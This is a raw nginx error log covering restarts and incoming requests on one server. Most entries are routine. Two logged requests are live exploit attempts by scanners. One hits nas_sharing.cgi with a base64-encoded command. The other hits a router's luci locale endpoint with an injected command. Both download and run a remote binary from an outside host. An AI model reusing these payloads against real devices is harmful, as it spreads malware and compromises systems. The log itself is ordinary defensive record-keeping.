2024/04/17 08:34:17 [notice] 1#1: using the "epoll" event method
2024/04/17 08:34:17 [notice] 1#1: nginx/1.22.1
2024/04/17 08:34:17 [notice] 1#1: built by gcc 10.2.1 20210110 (Debian 10.2.1-6) 
2024/04/17 08:34:17 [notice] 1#1: OS: Linux 3.10.0-1160.108.1.el7.x86_64
2024/04/17 08:34:17 [notice] 1#1: getrlimit(RLIMIT_NOFILE): 1048576:1048576
2024/04/17 08:34:17 [notice] 1#1: start worker processes
2024/04/17 08:34:17 [notice] 1#1: start worker process 29
2024/04/17 08:34:17 [notice] 1#1: start worker process 30
2024/04/17 08:43:54 [notice] 1#1: signal 3 (SIGQUIT) received, shutting down
2024/04/17 08:43:54 [notice] 29#29: gracefully shutting down
2024/04/17 08:43:54 [notice] 30#30: gracefully shutting down
2024/04/17 08:43:54 [notice] 29#29: exiting
2024/04/17 08:43:54 [notice] 30#30: exiting
2024/04/17 08:43:54 [notice] 29#29: exit
2024/04/17 08:43:54 [notice] 30#30: exit
2024/04/17 08:43:54 [notice] 1#1: signal 17 (SIGCHLD) received from 29
2024/04/17 08:43:54 [notice] 1#1: worker process 29 exited with code 0
2024/04/17 08:43:54 [notice] 1#1: signal 29 (SIGIO) received
2024/04/17 08:43:54 [notice] 1#1: signal 17 (SIGCHLD) received from 30
2024/04/17 08:43:54 [notice] 1#1: worker process 30 exited with code 0
2024/04/17 08:43:54 [notice] 1#1: exit
2024/04/17 08:45:35 [notice] 1#1: using the "epoll" event method
2024/04/17 08:45:35 [notice] 1#1: nginx/1.22.1
2024/04/17 08:45:35 [notice] 1#1: built by gcc 10.2.1 20210110 (Debian 10.2.1-6) 
2024/04/17 08:45:35 [notice] 1#1: OS: Linux 3.10.0-1160.108.1.el7.x86_64
2024/04/17 08:45:35 [notice] 1#1: getrlimit(RLIMIT_NOFILE): 1048576:1048576
2024/04/17 08:45:35 [notice] 1#1: start worker processes
2024/04/17 08:45:35 [notice] 1#1: start worker process 22
2024/04/17 08:45:35 [notice] 1#1: start worker process 23
2024/04/17 11:23:53 [notice] 1#1: signal 3 (SIGQUIT) received, shutting down
2024/04/17 11:23:53 [notice] 22#22: gracefully shutting down
2024/04/17 11:23:53 [notice] 22#22: exiting
2024/04/17 11:23:53 [notice] 22#22: exit
2024/04/17 11:23:53 [notice] 23#23: gracefully shutting down
2024/04/17 11:23:53 [notice] 23#23: exiting
2024/04/17 11:23:53 [notice] 23#23: exit
2024/04/17 11:23:53 [notice] 1#1: signal 17 (SIGCHLD) received from 22
2024/04/17 11:23:53 [notice] 1#1: worker process 22 exited with code 0
2024/04/17 11:23:53 [notice] 1#1: worker process 23 exited with code 0
2024/04/17 11:23:53 [notice] 1#1: exit
2024/04/17 11:27:16 [notice] 1#1: using the "epoll" event method
2024/04/17 11:27:16 [notice] 1#1: nginx/1.22.1
2024/04/17 11:27:16 [notice] 1#1: built by gcc 10.2.1 20210110 (Debian 10.2.1-6) 
2024/04/17 11:27:16 [notice] 1#1: OS: Linux 3.10.0-1160.108.1.el7.x86_64
2024/04/17 11:27:16 [notice] 1#1: getrlimit(RLIMIT_NOFILE): 1048576:1048576
2024/04/17 11:27:16 [notice] 1#1: start worker processes
2024/04/17 11:27:16 [notice] 1#1: start worker process 22
2024/04/17 11:27:16 [notice] 1#1: start worker process 23
2024/04/17 11:30:44 [error] 22#22: *1 directory index of "/usr/share/nginx/html/" is forbidden, client: 212.70.149.134, server: localhost, request: "GET / HTTP/1.0"
2024/04/17 11:49:15 [error] 23#23: *2 directory index of "/usr/share/nginx/html/" is forbidden, client: 113.215.188.145, server: localhost, request: "GET / HTTP/1.1", host: "8.148.22.188"
2024/04/17 11:49:15 [error] 23#23: *2 open() "/usr/share/nginx/html/favicon.ico" failed (2: No such file or directory), client: 113.215.188.145, server: localhost, request: "GET /favicon.ico HTTP/1.1", host: "8.148.22.188"
2024/04/17 11:57:11 [error] 22#22: *3 open() "/usr/share/nginx/html/cgi-bin/nas_sharing.cgi" failed (2: No such file or directory), client: 80.94.92.60, server: localhost, request: "GET /cgi-bin/nas_sharing.cgi?user=messagebus&passwd=&cmd=15&system=cm0JLXJmCWxvbAl8CXdnZXQJLU8tCWh0dHA6Ly85NC4xNTYuOC4yNDQvbG9sfHNo HTTP/1.1", host: "8.148.22.188:80"
2024/04/17 12:32:48 [error] 22#22: *4 directory index of "/usr/share/nginx/html/" is forbidden, client: 185.224.128.43, server: localhost, request: "GET / HTTP/1.1", host: "8.148.22.188"
2024/04/17 13:27:15 [error] 22#22: *5 directory index of "/usr/share/nginx/html/" is forbidden, client: 80.94.92.60, server: localhost, request: "GET / HTTP/1.1", host: "8.148.22.188"
2024/04/17 13:43:05 [error] 22#22: *6 directory index of "/usr/share/nginx/html/" is forbidden, client: 113.215.189.121, server: localhost, request: "GET / HTTP/1.1", host: "8.148.22.188"
2024/04/17 13:43:05 [error] 22#22: *6 open() "/usr/share/nginx/html/favicon.ico" failed (2: No such file or directory), client: 113.215.189.121, server: localhost, request: "GET /favicon.ico HTTP/1.1", host: "8.148.22.188"
2024/04/17 13:43:06 [error] 22#22: *7 directory index of "/usr/share/nginx/html/" is forbidden, client: 113.215.189.88, server: localhost, request: "GET / HTTP/1.1", host: "8.148.22.188"
2024/04/17 13:43:06 [error] 22#22: *7 open() "/usr/share/nginx/html/favicon.ico" failed (2: No such file or directory), client: 113.215.189.88, server: localhost, request: "GET /favicon.ico HTTP/1.1", host: "8.148.22.188"
2024/04/17 13:46:13 [error] 22#22: *8 directory index of "/usr/share/nginx/html/" is forbidden, client: 113.215.189.121, server: localhost, request: "GET / HTTP/1.1", host: "8.148.22.188"
2024/04/17 14:39:25 [error] 22#22: *9 directory index of "/usr/share/nginx/html/" is forbidden, client: 219.82.2.10, server: localhost, request: "GET / HTTP/1.1", host: "8.148.22.188"
2024/04/17 14:40:00 [error] 22#22: *10 open() "/usr/share/nginx/html/cgi-bin/luci/;stok=/locale" failed (2: No such file or directory), client: 179.43.190.218, server: localhost, request: "GET /cgi-bin/luci/;stok=/locale?form=country&operation=write&country=$(cd+%2Ftmp%3B+rm+-rf+shk%3B+wget+http%3A%2F%2F103.163.214.97%2Fshk%3B+chmod+777+shk%3B+.%2Fshk+tplink%3B+rm+-rf+shk) HTTP/1.1", host: "8.148.22.188:80"
2024/04/17 14:50:51 [error] 22#22: *11 directory index of "/usr/share/nginx/html/" is forbidden, client: 113.215.188.145, server: localhost, request: "GET / HTTP/1.1", host: "8.148.22.188"
2024/04/17 14:50:51 [error] 22#22: *11 open() "/usr/share/nginx/html/favicon.ico" failed (2: No such file or directory), client: 113.215.188.145, server: localhost, request: "GET /favicon.ico HTTP/1.1", host: "8.148.22.188"
2024/04/17 14:54:38 [error] 22#22: *12 directory index of "/usr/share/nginx/html/" is forbidden, client: 113.215.188.145, server: localhost, request: "GET / HTTP/1.1", host: "8.148.22.188"
